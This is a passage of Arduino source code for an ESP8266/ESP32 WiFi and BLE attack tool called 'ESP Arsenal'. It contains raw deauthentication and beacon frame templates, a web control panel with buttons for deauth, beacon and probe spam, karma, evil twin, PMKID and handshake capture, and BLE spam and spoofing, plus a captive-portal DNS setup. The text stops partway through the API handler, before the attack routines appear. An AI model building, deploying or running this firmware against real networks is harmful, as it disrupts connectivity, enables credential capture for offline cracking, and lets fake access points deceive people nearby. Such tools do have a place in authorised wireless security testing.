/*
 * 0x0806 ESP Arsenal - Advanced WiFi/BLE Security Testing Platform
 * Compatible with ESP8266 and ESP32
 * Author: 0x0806
 * Version: 3.0 - Production Ready
 */

#ifdef ESP32
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>
#include <esp_task_wdt.h>
#include <SPIFFS.h>
#define PLATFORM "ESP32"
WebServer server(80);
#else
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
extern "C" {
#include "user_interface.h"
}
#define PLATFORM "ESP8266"
ESP8266WebServer server(80);
#endif

#include <EEPROM.h>

// Configuration
#define AP_SSID "0x0806-Arsenal"
#define AP_PASS "0x0806123"
#define DNS_PORT 53
#define MAX_NETWORKS 128
#define MAX_STATIONS 64
#define EEPROM_SIZE 1024

// Attack types
enum AttackType {
  ATTACK_NONE,
  ATTACK_DEAUTH,
  ATTACK_BEACON_SPAM,
  ATTACK_PROBE_SPAM,
  ATTACK_KARMA,
  ATTACK_EVIL_TWIN,
  ATTACK_PMKID,
  ATTACK_HANDSHAKE,
  ATTACK_MONITOR,
#ifdef ESP32
  ATTACK_BLE_SPAM,
  ATTACK_BLE_BEACON,
  ATTACK_BLE_SPOOF,
  ATTACK_5GHZ_DEAUTH,
  ATTACK_DUAL_BAND
#endif
};

// Global variables
DNSServer dnsServer;
AttackType currentAttack = ATTACK_NONE;
bool attackRunning = false;
bool systemReady = false;
unsigned long attackStartTime = 0;
unsigned long lastStatsUpdate = 0;
unsigned long lastAPCheck = 0;
unsigned long packetsPerSecond = 0;
unsigned long totalPackets = 0;
unsigned long lastPacketCount = 0;
unsigned long blePackets = 0;
unsigned long wifiPackets = 0;

// Network structures
struct NetworkInfo {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  bool encrypted;
  bool selected;
  bool is5GHz;
};

struct StationInfo {
  String mac;
  String bssid;
  int channel;
  int rssi;
  bool selected;
};

NetworkInfo networks[MAX_NETWORKS];
StationInfo stations[MAX_STATIONS];
int networkCount = 0;
int stationCount = 0;
int selectedNetworks = 0;
int selectedStations = 0;

// Attack configuration
int attackChannel = 1;
int attack5GHzChannel = 36;
String targetSSID = "";
String targetBSSID = "";
bool randomizeChannel = true;
int beaconInterval = 100;
int deauthInterval = 20;
bool dualBandMode = false;
bool bleEnabled = false;

#ifdef ESP32
TaskHandle_t attackTask = NULL;
TaskHandle_t monitorTask = NULL;
TaskHandle_t bleTask = NULL;
BLEAdvertising* pAdvertising = nullptr;
bool bleInitialized = false;
#endif

// Enhanced packet templates
uint8_t deauthPacket[] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

uint8_t beaconPacket[] = {
  0x80, 0x00, 0x00, 0x00,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x64, 0x00,
  0x11, 0x04, 0x00, 0x00
};

// Modern dark-themed CSS
const char* htmlPage = R"html(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta http-equiv="refresh" content="60">
<title>0x0806 ESP Arsenal</title>
<style>
:root {
  --primary-color: #00ff41;
  --secondary-color: #ff6b35;
  --bg-dark: #0a0a0a;
  --bg-card: #1a1a1a;
  --bg-input: #2a2a2a;
  --border-color: #333;
  --text-primary: #ffffff;
  --text-secondary: #cccccc;
  --danger-color: #ff4444;
  --success-color: #44ff44;
  --warning-color: #ffaa00;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  background: linear-gradient(135deg, var(--bg-dark) 0%, #111 100%);
  color: var(--text-primary);
  line-height: 1.6;
  overflow-x: hidden;
}

.container {
  max-width: 1400px;
  margin: 0 auto;
  padding: 20px;
}

.header {
  text-align: center;
  margin-bottom: 40px;
  padding: 30px 0;
  background: linear-gradient(135deg, var(--bg-card) 0%, #222 100%);
  border-radius: 15px;
  box-shadow: 0 10px 30px rgba(0,255,65,0.1);
  position: relative;
  overflow: hidden;
}

.header::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(0,255,65,0.1), transparent);
  animation: shine 3s infinite;
}

@keyframes shine {
  0% { left: -100%; }
  100% { left: 100%; }
}

.header h1 {
  font-size: 3rem;
  background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  margin-bottom: 10px;
  text-shadow: 0 0 20px rgba(0,255,65,0.3);
}

.header p {
  font-size: 1.2rem;
  color: var(--text-secondary);
  margin-bottom: 15px;
}

.platform-badge {
  display: inline-block;
  padding: 8px 20px;
  background: linear-gradient(135deg, var(--secondary-color), #ff8a65);
  color: white;
  border-radius: 25px;
  font-weight: bold;
  text-transform: uppercase;
  letter-spacing: 1px;
  box-shadow: 0 4px 15px rgba(255,107,53,0.3);
}

.nav {
  display: flex;
  justify-content: center;
  flex-wrap: wrap;
  gap: 15px;
  margin: 30px 0;
}

.nav-btn {
  background: linear-gradient(135deg, var(--bg-card), #333);
  border: 2px solid var(--primary-color);
  color: var(--primary-color);
  padding: 12px 25px;
  text-decoration: none;
  border-radius: 25px;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  position: relative;
  overflow: hidden;
}

.nav-btn::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(0,255,65,0.2), transparent);
  transition: left 0.5s;
}

.nav-btn:hover::before {
  left: 100%;
}

.nav-btn:hover, .nav-btn.active {
  background: linear-gradient(135deg, var(--primary-color), #00cc33);
  color: var(--bg-dark);
  box-shadow: 0 8px 25px rgba(0,255,65,0.4);
  transform: translateY(-2px);
}

.section {
  background: linear-gradient(135deg, var(--bg-card), #222);
  border: 1px solid var(--border-color);
  border-radius: 15px;
  padding: 30px;
  margin: 30px 0;
  box-shadow: 0 10px 30px rgba(0,0,0,0.3);
  backdrop-filter: blur(10px);
  position: relative;
  overflow: hidden;
}

.section::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 3px;
  background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
}

.section h2 {
  color: var(--secondary-color);
  margin-bottom: 25px;
  font-size: 1.8rem;
  text-align: center;
  text-transform: uppercase;
  letter-spacing: 1px;
}

.stats {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 20px;
  margin: 25px 0;
}

.stat-card {
  background: linear-gradient(135deg, var(--bg-input), #333);
  border: 1px solid var(--primary-color);
  border-radius: 12px;
  padding: 25px;
  text-align: center;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

.stat-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
}

.stat-card:hover {
  transform: translateY(-5px);
  box-shadow: 0 15px 35px rgba(0,255,65,0.2);
}

.stat-value {
  font-size: 2.5rem;
  font-weight: bold;
  color: var(--primary-color);
  text-shadow: 0 0 10px rgba(0,255,65,0.5);
  margin-bottom: 10px;
}

.stat-label {
  color: var(--text-secondary);
  font-size: 0.9rem;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
  gap: 25px;
  margin: 25px 0;
}

.card {
  background: linear-gradient(135deg, var(--bg-input), #333);
  border: 1px solid var(--border-color);
  border-radius: 12px;
  padding: 25px;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
  transform: scaleX(0);
  transition: transform 0.3s ease;
}

.card:hover::before {
  transform: scaleX(1);
}

.card:hover {
  transform: translateY(-5px);
  box-shadow: 0 15px 35px rgba(0,255,65,0.15);
  border-color: var(--primary-color);
}

.card h3 {
  color: var(--primary-color);
  margin-bottom: 15px;
  font-size: 1.3rem;
}

.card p {
  color: var(--text-secondary);
  margin-bottom: 20px;
  line-height: 1.5;
}

.btn {
  background: linear-gradient(135deg, var(--bg-card), #444);
  border: 2px solid var(--primary-color);
  color: var(--primary-color);
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: 600;
  font-size: 0.9rem;
  transition: all 0.3s ease;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  margin: 5px;
  position: relative;
  overflow: hidden;
}

.btn::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(0,255,65,0.2), transparent);
  transition: left 0.5s;
}

.btn:hover::before {
  left: 100%;
}

.btn:hover {
  background: linear-gradient(135deg, var(--primary-color), #00cc33);
  color: var(--bg-dark);
  box-shadow: 0 8px 25px rgba(0,255,65,0.4);
  transform: translateY(-2px);
}

.btn-danger {
  border-color: var(--danger-color);
  color: var(--danger-color);
}

.btn-danger:hover {
  background: linear-gradient(135deg, var(--danger-color), #ff6666);
  color: white;
  box-shadow: 0 8px 25px rgba(255,68,68,0.4);
}

.btn-success {
  border-color: var(--success-color);
  color: var(--success-color);
}

.btn-success:hover {
  background: linear-gradient(135deg, var(--success-color), #66ff66);
  color: var(--bg-dark);
  box-shadow: 0 8px 25px rgba(68,255,68,0.4);
}

.status {
  padding: 20px;
  border-radius: 10px;
  margin: 20px 0;
  text-align: center;
  font-weight: bold;
  font-size: 1.1rem;
  text-transform: uppercase;
  letter-spacing: 1px;
}

.status-active {
  background: linear-gradient(135deg, #004400, #006600);
  border: 2px solid var(--success-color);
  color: var(--success-color);
  box-shadow: 0 0 20px rgba(68,255,68,0.3);
}

.status-inactive {
  background: linear-gradient(135deg, #440000, #660000);
  border: 2px solid var(--danger-color);
  color: var(--danger-color);
  box-shadow: 0 0 20px rgba(255,68,68,0.3);
}

.input, .select {
  background: var(--bg-input);
  border: 1px solid var(--border-color);
  color: var(--text-primary);
  padding: 12px;
  border-radius: 8px;
  width: 100%;
  margin: 8px 0;
  font-size: 1rem;
  transition: all 0.3s ease;
}

.input:focus, .select:focus {
  outline: none;
  border-color: var(--primary-color);
  box-shadow: 0 0 10px rgba(0,255,65,0.3);
}

.network-list {
  max-height: 400px;
  overflow-y: auto;
  border-radius: 10px;
  background: var(--bg-input);
  scrollbar-width: thin;
  scrollbar-color: var(--primary-color) var(--bg-input);
}

.network-list::-webkit-scrollbar {
  width: 8px;
}

.network-list::-webkit-scrollbar-track {
  background: var(--bg-input);
}

.network-list::-webkit-scrollbar-thumb {
  background: var(--primary-color);
  border-radius: 4px;
}

.network-item {
  display: flex;
  align-items: center;
  padding: 15px;
  border-bottom: 1px solid var(--border-color);
  transition: all 0.3s ease;
}

.network-item:hover {
  background: rgba(0,255,65,0.1);
}

.network-item:last-child {
  border-bottom: none;
}

.network-info {
  flex: 1;
  margin-left: 15px;
}

.network-name {
  font-weight: bold;
  color: var(--primary-color);
  font-size: 1.1rem;
  margin-bottom: 5px;
}

.network-details {
  font-size: 0.9rem;
  color: var(--text-secondary);
  line-height: 1.4;
}

.checkbox {
  width: 20px;
  height: 20px;
  accent-color: var(--primary-color);
}

.progress {
  width: 100%;
  height: 25px;
  background: var(--bg-input);
  border-radius: 15px;
  overflow: hidden;
  margin: 15px 0;
  position: relative;
}

.progress-bar {
  height: 100%;
  background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
  transition: width 0.3s ease;
  border-radius: 15px;
}

.log {
  background: var(--bg-dark);
  border: 1px solid var(--border-color);
  border-radius: 8px;
  padding: 15px;
  height: 250px;
  overflow-y: auto;
  font-family: 'Courier New', monospace;
  font-size: 0.9rem;
  line-height: 1.4;
}

.log-entry {
  margin: 3px 0;
  padding: 5px;
  border-radius: 3px;
}

.log-info { color: var(--primary-color); }
.log-warn { color: var(--warning-color); }
.log-error { color: var(--danger-color); }

.attack-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 20px;
  margin: 25px 0;
}

.attack-card {
  background: linear-gradient(135deg, var(--bg-input), #333);
  border: 1px solid var(--border-color);
  border-radius: 12px;
  padding: 20px;
  text-align: center;
  transition: all 0.3s ease;
  position: relative;
  overflow: hidden;
}

.attack-card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 3px;
  background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
  transform: scaleX(0);
  transition: transform 0.3s ease;
}

.attack-card:hover::before {
  transform: scaleX(1);
}

.attack-card:hover {
  transform: translateY(-5px);
  box-shadow: 0 15px 35px rgba(0,255,65,0.2);
  border-color: var(--primary-color);
}

.attack-card h3 {
  color: var(--primary-color);
  margin-bottom: 10px;
  font-size: 1.2rem;
}

.attack-card p {
  color: var(--text-secondary);
  margin-bottom: 15px;
  font-size: 0.9rem;
}

.pulse {
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { opacity: 1; }
  50% { opacity: 0.5; }
  100% { opacity: 1; }
}

.glow {
  animation: glow 2s ease-in-out infinite alternate;
}

@keyframes glow {
  from { text-shadow: 0 0 5px var(--primary-color); }
  to { text-shadow: 0 0 20px var(--primary-color); }
}

@media (max-width: 768px) {
  .container { padding: 15px; }
  .header h1 { font-size: 2rem; }
  .nav { flex-direction: column; align-items: center; }
  .stats { grid-template-columns: repeat(2, 1fr); }
  .grid { grid-template-columns: 1fr; }
  .attack-grid { grid-template-columns: 1fr; }
  .stat-value { font-size: 2rem; }
}

@media (max-width: 480px) {
  .header { padding: 20px; }
  .header h1 { font-size: 1.5rem; }
  .stats { grid-template-columns: 1fr; }
  .section { padding: 20px; margin: 20px 0; }
  .nav-btn { padding: 10px 15px; font-size: 0.9rem; }
  .btn { padding: 10px 15px; font-size: 0.8rem; }
}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1 class="glow">0x0806 ESP Arsenal</h1>
    <p>Advanced WiFi/BLE Security Testing Platform</p>
    <div class="platform-badge">PLATFORM_PLACEHOLDER</div>
  </div>

  <div class="nav">
    <a href="#" class="nav-btn active" onclick="showSection('dashboard')">Dashboard</a>
    <a href="#" class="nav-btn" onclick="showSection('networks')">Networks</a>
    <a href="#" class="nav-btn" onclick="showSection('stations')">Stations</a>
    <a href="#" class="nav-btn" onclick="showSection('attacks')">Attacks</a>
    <a href="#" class="nav-btn" onclick="showSection('settings')">Settings</a>
  </div>

  <div id="dashboard" class="section">
    <h2>System Status</h2>
    <div class="stats">
      <div class="stat-card">
        <div class="stat-value pulse" id="networkCount">NETWORK_COUNT</div>
        <div class="stat-label">Networks Found</div>
      </div>
      <div class="stat-card">
        <div class="stat-value pulse" id="stationCount">STATION_COUNT</div>
        <div class="stat-label">Stations Found</div>
      </div>
      <div class="stat-card">
        <div class="stat-value pulse" id="packetRate">PACKET_RATE</div>
        <div class="stat-label">Packets/sec</div>
      </div>
      <div class="stat-card">
        <div class="stat-value pulse" id="totalPackets">TOTAL_PACKETS</div>
        <div class="stat-label">Total Packets</div>
      </div>
    </div>

    <div class="status STATUS_CLASS">
      <span id="statusText">ATTACK_STATUS</span>
    </div>

    <div class="grid">
      <div class="card">
        <h3>Quick Scan</h3>
        <p>Discover nearby networks and stations</p>
        <button class="btn" onclick="scanNetworks()">Scan WiFi</button>
        <button class="btn" onclick="scanStations()">Scan Stations</button>
      </div>
      <div class="card">
        <h3>Attack Control</h3>
        <p>Manage active attack operations</p>
        <button class="btn btn-danger" onclick="stopAttack()">Stop All</button>
        <button class="btn btn-success" onclick="showSection('attacks')">Launch Attack</button>
      </div>
    </div>
  </div>

  <div id="networks" class="section" style="display:none;">
    <h2>WiFi Networks (NETWORK_COUNT found)</h2>
    <div style="text-align:center; margin-bottom:20px;">
      <button class="btn" onclick="scanNetworks()">Refresh Scan</button>
      <button class="btn" onclick="selectAllNetworks()">Select All</button>
      <button class="btn" onclick="selectNoneNetworks()">Select None</button>
    </div>
    <div class="network-list" id="networkList">
      NETWORK_LIST
    </div>
  </div>

  <div id="stations" class="section" style="display:none;">
    <h2>Client Stations (STATION_COUNT found)</h2>
    <div style="text-align:center; margin-bottom:20px;">
      <button class="btn" onclick="scanStations()">Refresh Scan</button>
      <button class="btn" onclick="selectAllStations()">Select All</button>
      <button class="btn" onclick="selectNoneStations()">Select None</button>
    </div>
    <div class="network-list" id="stationList">
      STATION_LIST
    </div>
  </div>

  <div id="attacks" class="section" style="display:none;">
    <h2>Attack Control Panel</h2>
    <div class="status STATUS_CLASS">
      <span id="attackStatus">ATTACK_STATUS</span>
    </div>

    <div class="attack-grid">
      <div class="attack-card">
        <h3>Deauthentication</h3>
        <p>Disconnect clients from selected networks</p>
        <button class="btn btn-danger" onclick="startAttack(1)">Start Deauth</button>
      </div>
      <div class="attack-card">
        <h3>Beacon Spam</h3>
        <p>Flood area with fake access points</p>
        <button class="btn" onclick="startAttack(2)">Start Beacon Spam</button>
      </div>
      <div class="attack-card">
        <h3>Probe Spam</h3>
        <p>Generate probe request flood</p>
        <button class="btn" onclick="startAttack(3)">Start Probe Spam</button>
      </div>
      <div class="attack-card">
        <h3>Karma Attack</h3>
        <p>Respond to all probe requests</p>
        <button class="btn" onclick="startAttack(4)">Start Karma</button>
      </div>
      <div class="attack-card">
        <h3>Evil Twin</h3>
        <p>Create fake access point copies</p>
        <button class="btn" onclick="startAttack(5)">Start Evil Twin</button>
      </div>
      <div class="attack-card">
        <h3>PMKID Capture</h3>
        <p>Capture PMKID for offline cracking</p>
        <button class="btn" onclick="startAttack(6)">Start PMKID</button>
      </div>
      <div class="attack-card">
        <h3>Handshake Capture</h3>
        <p>Capture WPA handshakes</p>
        <button class="btn" onclick="startAttack(7)">Start Handshake</button>
      </div>
      <div class="attack-card">
        <h3>Packet Monitor</h3>
        <p>Monitor all wireless traffic</p>
        <button class="btn" onclick="startAttack(8)">Start Monitor</button>
      </div>
      ESP32_ATTACKS
    </div>
  </div>

  <div id="settings" class="section" style="display:none;">
    <h2>Attack Configuration</h2>
    <div class="grid">
      <div class="card">
        <h3>Channel Settings</h3>
        <label>2.4GHz Channel:</label>
        <input type="number" class="input" id="channel24" value="CHANNEL_24" min="1" max="14">
        <label>5GHz Channel:</label>
        <input type="number" class="input" id="channel5" value="CHANNEL_5" min="36" max="165">
        <label><input type="checkbox" class="checkbox" id="randomize" RANDOMIZE_CHECKED> Randomize Channels</label>
      </div>
      <div class="card">
        <h3>Timing Settings</h3>
        <label>Beacon Interval (ms):</label>
        <input type="number" class="input" id="beaconInterval" value="BEACON_INTERVAL" min="10" max="1000">
        <label>Deauth Interval (ms):</label>
        <input type="number" class="input" id="deauthInterval" value="DEAUTH_INTERVAL" min="10" max="1000">
      </div>
      <div class="card">
        <h3>Advanced Options</h3>
        <label><input type="checkbox" class="checkbox" id="dualBand" DUAL_BAND_CHECKED> Dual Band Mode</label>
        <label><input type="checkbox" class="checkbox" id="bleEnabled" BLE_ENABLED_CHECKED> BLE Attacks</label>
        <button class="btn btn-success" onclick="saveSettings()">Save Settings</button>
      </div>
    </div>
  </div>
</div>

<script>
function showSection(section) {
  document.querySelectorAll(\".section\").forEach(s => s.style.display = \"none\");
  document.querySelectorAll(\".nav-btn\").forEach(b => b.classList.remove(\"active\"));
  document.getElementById(section).style.display = \"block\";
  event.target.classList.add(\"active\");
}

function scanNetworks() {
  fetch(\"/api?action=scan_networks\").then(function(r) { return r.text(); }).then(function(d) { 
    setTimeout(function() { location.reload(); }, 1000); 
  });
}

function scanStations() {
  fetch(\"/api?action=scan_stations\").then(function(r) { return r.text(); }).then(function(d) { 
    setTimeout(function() { location.reload(); }, 1000); 
  });
}

function startAttack(type) {
  fetch('/api?action=start_attack&type=' + type).then(function(r) { return r.text(); }).then(function(d) { 
    setTimeout(function() { location.reload(); }, 1000); 
  });
}

function stopAttack() {
  fetch('/api?action=stop_attack').then(function(r) { return r.text(); }).then(function(d) { 
    setTimeout(function() { location.reload(); }, 1000); 
  });
}

function selectAllNetworks() {
  var checkboxes = document.querySelectorAll('#networkList input[type="checkbox"]');
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].checked = true;
    selectNetwork(checkboxes[i].dataset.index);
  }
}

function selectNoneNetworks() {
  var checkboxes = document.querySelectorAll('#networkList input[type="checkbox"]');
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].checked = false;
    selectNetwork(checkboxes[i].dataset.index);
  }
}

function selectAllStations() {
  var checkboxes = document.querySelectorAll('#stationList input[type="checkbox"]');
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].checked = true;
    selectStation(checkboxes[i].dataset.index);
  }
}

function selectNoneStations() {
  var checkboxes = document.querySelectorAll('#stationList input[type="checkbox"]');
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].checked = false;
    selectStation(checkboxes[i].dataset.index);
  }
}

function selectNetwork(index) {
  fetch('/api?action=select_network&index=' + index);
}

function selectStation(index) {
  fetch('/api?action=select_station&index=' + index);
}

function saveSettings() {
  var data = {
    channel24: document.getElementById('channel24').value,
    channel5: document.getElementById('channel5').value,
    randomize: document.getElementById('randomize').checked,
    beaconInterval: document.getElementById('beaconInterval').value,
    deauthInterval: document.getElementById('deauthInterval').value,
    dualBand: document.getElementById('dualBand').checked,
    bleEnabled: document.getElementById('bleEnabled').checked
  };

  var params = Object.keys(data).map(function(k) { 
    return k + '=' + encodeURIComponent(data[k]); 
  }).join('&');

  fetch('/api?action=save_settings&' + params).then(function(r) { return r.text(); }).then(function(d) {
    alert('Settings saved successfully');
    setTimeout(function() { location.reload(); }, 500);
  });
}

setInterval(function() {
  if (document.getElementById('dashboard').style.display !== 'none') {
    fetch('/api?action=get_stats').then(function(r) { return r.json(); }).then(function(data) {
      document.getElementById('networkCount').textContent = data.networks;
      document.getElementById('stationCount').textContent = data.stations;
      document.getElementById('packetRate').textContent = data.packetRate;
      document.getElementById('totalPackets').textContent = data.totalPackets;
    });
  }
}, 5000);
</script>
</body>
</html>
)html";

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("\n=== 0x0806 ESP Arsenal v3.0 ===");
  Serial.println("Platform: " PLATFORM);
  Serial.println("Initializing system...");

  // Initialize storage
  EEPROM.begin(EEPROM_SIZE);

#ifdef ESP32
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS Mount Failed");
  }
#else
  if (!LittleFS.begin()) {
    Serial.println("LittleFS Mount Failed");
  }
#endif

  // Load settings from EEPROM
  loadSettings();

  // Initialize WiFi
  WiFi.disconnect(true);
  delay(100);

  // Setup Access Point with stable configuration
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);

  // Configure AP IP
  IPAddress apIP(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, apIP, subnet);

  delay(2000);

  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP: ");
  Serial.println(IP);

  // Setup DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", IP);

  // Setup web server
  setupWebServer();

#ifdef ESP32
  // Initialize BLE
  initializeBLE();

  // Create tasks
  xTaskCreatePinnedToCore(attackTaskCore, "AttackTask", 8192, NULL, 2, &attackTask, 0);
  xTaskCreatePinnedToCore(monitorTaskCore, "MonitorTask", 8192, NULL, 1, &monitorTask, 1);
  xTaskCreatePinnedToCore(bleTaskCore, "BLETask", 8192, NULL, 1, &bleTask, 1);

  // Initialize watchdog
  esp_task_wdt_init(30, true);
#endif

  systemReady = true;
  Serial.println("System ready!");
  Serial.println("Connect to: " AP_SSID);
  Serial.println("Password: " AP_PASS);
  Serial.println("Portal: http://192.168.4.1");
}

void loop() {
  if (!systemReady) return;

  // Handle DNS and web requests
  dnsServer.processNextRequest();
  server.handleClient();

  // Check AP stability
  if (millis() - lastAPCheck > 5000) {
    if (WiFi.softAPgetStationNum() == 0 && WiFi.status() != WL_CONNECTED) {
      // Restart AP if needed
      WiFi.softAP(AP_SSID, AP_PASS, 6, 0, 8);
    }
    lastAPCheck = millis();
  }

  // Update statistics
  if (millis() - lastStatsUpdate > 1000) {
    updateStats();
    lastStatsUpdate = millis();
  }

#ifndef ESP32
  // Handle attacks on ESP8266 main loop
  if (attackRunning) {
    handleAttackESP8266();
  }
#endif

  yield();
}

void setupWebServer() {
  server.on("/", HTTP_GET, handleRoot);
  server.on("/api", HTTP_GET, handleAPI);
  server.on("/generate_204", HTTP_GET, handleRoot); // Android captive portal
  server.on("/fwlink", HTTP_GET, handleRoot); // Windows captive portal
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("Web server started on port 80");
}

void handleRoot() {
  String html = htmlPage;

  // Replace placeholders
  html.replace("PLATFORM_PLACEHOLDER", PLATFORM);
  html.replace("NETWORK_COUNT", String(networkCount));
  html.replace("STATION_COUNT", String(stationCount));
  html.replace("PACKET_RATE", String(packetsPerSecond));
  html.replace("TOTAL_PACKETS", String(totalPackets));
  html.replace("ATTACK_STATUS", attackRunning ? "ATTACK ACTIVE" : "STANDBY");
  html.replace("STATUS_CLASS", attackRunning ? "status-active" : "status-inactive");
  html.replace("CHANNEL_24", String(attackChannel));
  html.replace("CHANNEL_5", String(attack5GHzChannel));
  html.replace("BEACON_INTERVAL", String(beaconInterval));
  html.replace("DEAUTH_INTERVAL", String(deauthInterval));
  html.replace("RANDOMIZE_CHECKED", randomizeChannel ? "checked" : "");
  html.replace("DUAL_BAND_CHECKED", dualBandMode ? "checked" : "");
  html.replace("BLE_ENABLED_CHECKED", bleEnabled ? "checked" : "");

  // Generate network list
  String networkList = "";
  for (int i = 0; i < networkCount; i++) {
    networkList += "<div class='network-item'>";
    networkList += "<input type='checkbox' class='checkbox' data-index='" + String(i) + "' " + (networks[i].selected ? "checked" : "") + " onchange='selectNetwork(" + String(i) + ")'>";
    networkList += "<div class='network-info'>";
    networkList += "<div class='network-name'>" + networks[i].ssid + "</div>";
    networkList += "<div class='network-details'>BSSID: " + networks[i].bssid + " | Ch: " + String(networks[i].channel) + " | RSSI: " + String(networks[i].rssi) + "dBm | " + (networks[i].encrypted ? "Encrypted" : "Open") + "</div>";
    networkList += "</div></div>";
  }
  html.replace("NETWORK_LIST", networkList);

  // Generate station list
  String stationList = "";
  for (int i = 0; i < stationCount; i++) {
    stationList += "<div class='network-item'>";
    stationList += "<input type='checkbox' class='checkbox' data-index='" + String(i) + "' " + (stations[i].selected ? "checked" : "") + " onchange='selectStation(" + String(i) + ")'>";
    stationList += "<div class='network-info'>";
    stationList += "<div class='network-name'>" + stations[i].mac + "</div>";
    stationList += "<div class='network-details'>Connected to: " + stations[i].bssid + " | Channel: " + String(stations[i].channel) + " | RSSI: " + String(stations[i].rssi) + "dBm</div>";
    stationList += "</div></div>";
  }
  html.replace("STATION_LIST", stationList);

  // ESP32 specific attacks
#ifdef ESP32
  String esp32Attacks = "\n<div class=\"attack-card\">\n<h3>BLE Spam</h3>\n<p>Flood area with BLE advertisements</p>\n<button class=\"btn\" onclick=\"startAttack(9)\">Start BLE Spam</button>\n</div>\n<div class=\"attack-card\">\n<h3>BLE Beacon Flood</h3>\n<p>Flood with various BLE beacons</p>\n<button class=\"btn\" onclick=\"startAttack(10)\">Start BLE Beacon</button>\n</div>\n<div class=\"attack-card\">\n<h3>BLE Spoofing</h3>\n<p>Spoof BLE device advertisements</p>\n<button class=\"btn\" onclick=\"startAttack(11)\">Start BLE Spoof</button>\n</div>\n<div class=\"attack-card\">\n<h3>5GHz Deauth</h3>\n<p>Deauth attack on 5GHz band</p>\n<button class=\"btn btn-danger\" onclick=\"startAttack(12)\">Start 5GHz Deauth</button>\n</div>\n<div class=\"attack-card\">\n<h3>Dual Band Attack</h3>\n<p>Simultaneous 2.4/5GHz attacks</p>\n<button class=\"btn\" onclick=\"startAttack(13)\">Start Dual Band</button>\n</div>";
  html.replace("ESP32_ATTACKS", esp32Attacks);
#else
  html.replace("ESP32_ATTACKS", "");
#endif

  server.send(200, "text/html", html);
}

void handleAPI() {
  String action = server.arg("action");
  String response = "OK";

  if (action == "scan_networks") {
    scanNetworks();
  } else if (action == "scan_stations") {
    scanStations();
  } else if (action == "start_attack") {
    int type = server.arg("type").toInt();
    startAttack((AttackType)type);
  } else if (action == "stop_attack") {
    stopAttack();
  } else if (action == "select_network") {
    int index = server.arg("index").toInt();
    if (index >= 0 && index < networkCount) {
      networks[index].selected = !networks[index].selected;
      if (networks[index].selected) selectedNetworks++;
      else selectedNetworks--;
    }
  } else if (action == "select_station") {
    int index = server.arg("index").toInt();
    if (index >= 0 && index < stationCount) {
      stations[index].selected = !stations[index].selected;
      if (stations[index].selected) selectedStations++;
      else selectedStations--;
    }
  } else if (action == "save_settings") {
    saveSettingsFromWeb();
  } else if (action == "get_stats") {
